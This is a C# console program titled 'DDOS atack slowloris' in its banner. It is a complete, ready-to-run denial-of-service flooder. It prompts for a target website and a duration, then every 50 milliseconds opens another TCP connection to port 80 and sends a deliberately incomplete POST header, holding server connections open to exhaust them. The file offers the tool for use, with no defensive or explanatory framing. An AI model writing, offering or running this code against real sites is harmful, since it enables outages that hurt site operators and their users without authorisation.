using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;

namespace HTTPFlooder
{
	internal class Program
	{
		public Program()
		{
		}

		private static void Main(string[] args)
		{
			Console.ForegroundColor = ConsoleColor.Green;
			Console.WriteLine("\n           +-----------------------------------------------------+");
			Console.WriteLine("             +                                                     +");
			Console.WriteLine("      -------+  DDOS atack slowloris				hanicraft		  +-------");
			Console.WriteLine("             +                                                     +");
			Console.WriteLine("             +-----------------------------------------------------+\n");
			Console.Write("Website Url: ");
			string str = Console.ReadLine();
			Console.Write("Duration (seconds): ");
			string str1 = Console.ReadLine();
			int num = 1;
			bool flag = true;
			(new Thread(() => {
				List<TcpClient> tcpClients = new List<TcpClient>();
				while (flag)
				{
					(new Thread(() => {
						TcpClient tcpClient = new TcpClient();
						tcpClients.Add(tcpClient);
						try
						{
							tcpClient.Connect(str, 80);
							StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
							streamWriter.Write(string.Concat("POST / HTTP/1.1\r\nHost: ", str, "\r\nContent-length: 5235\r\n\r\n"));
							streamWriter.Flush();
							if (flag)
							{
								Console.WriteLine(string.Concat("Packets sent: ", num));
							}
							num++;
						}
						catch (Exception exception)
						{
							if (flag)
							{
								Console.WriteLine("Could not send packets, server may be inaccessible.");
							}
						}
					})).Start();
					Thread.Sleep(50);
				}
				foreach (TcpClient tcpClient1 in tcpClients)
				{
					try
					{
						tcpClient1.GetStream().Dispose();
					}
					catch (Exception exception1)
					{
					}
				}
			})).Start();
			Thread.Sleep(int.Parse(str1) * 1000);
			flag = false;
			Console.WriteLine("\nDone (:");
			Console.WriteLine("Press any key to close this program...");
			Console.ReadKey();
		}
	}
}